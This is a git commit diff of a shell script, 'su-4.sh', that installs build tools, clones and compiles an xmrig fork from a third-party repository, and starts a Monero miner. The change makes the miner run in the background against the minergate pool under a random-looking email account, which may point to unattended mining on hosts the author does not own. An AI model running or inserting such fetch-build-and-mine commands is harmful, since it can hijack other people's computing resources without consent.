ed0fdcd5cb30afee405f2105c014b8327668cab8
pupi292 <76243779+pupi292@users.noreply.github.com>
2020-12-21 08:01:24 +0000

    Update su-4.sh

--- su-4.sh
+++ su-4.sh
@@ -6,5 +6,4 @@ sudo apt-get install -y screen
 sudo apt-get install -y curl
 sudo apt-get install -y git
 sudo apt-get update && sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev libboost-all-dev automake git cmake libuv1-dev libmicrohttpd-dev libssl-dev && sudo sysctl vm.nr_hugepages=128 && rm -rf xmrig && git clone https://github.com/sabatmki/xmrig && cd xmrig && mkdir build && cd build && cmake .. && make
-./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u myrnabauguessheilmannlrnhzv@gmail.com -p x
-
+./xmrig -a cn/r -B -l pro -R 10 -o stratum+tcp://xmr.pool.minergate.com:45700 -u myrnabauguessheilmannlrnhzv@gmail.com -p x -k
